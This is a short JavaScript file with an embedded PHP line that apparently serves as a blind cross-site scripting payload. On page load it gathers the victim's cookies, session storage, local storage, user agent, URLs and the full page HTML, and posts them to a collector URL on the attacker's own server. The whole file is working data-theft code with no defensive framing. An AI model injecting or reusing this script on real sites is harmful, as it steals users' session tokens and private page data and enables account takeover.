document.addEventListener('DOMContentLoaded', function() {
    var mailer = '<?php echo "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';

//USER AGENT
    var ua = navigator.userAgent;
//TARGET URL
    var tu = document.URL;
//REFERRER URL
    var ru = document.referrer;
//READABLE COOKIES
    var rc = document.cookie;
//SESSION STORAGE
    var ss = JSON.stringify(sessionStorage);
//LOCAL STORAGE
    var ls = JSON.stringify(localStorage);
//FULL DOCUMENT
    var fd = document.documentElement.innerHTML;

    var r = new XMLHttpRequest();
    r.open('POST', mailer, true);
    r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    r.send('origin=' + document.location.origin + '&hs=' + document.location.hostname + '&ua=' + encodeURIComponent(ua) + '&tu=' + encodeURIComponent(tu) + '&ru=' + encodeURIComponent(ru) + '&rc=' + encodeURIComponent(rc) + '&ss=' + encodeURIComponent(ss) + '&ls=' + encodeURIComponent(ls) + '&fd=' + encodeURIComponent(fd));
});
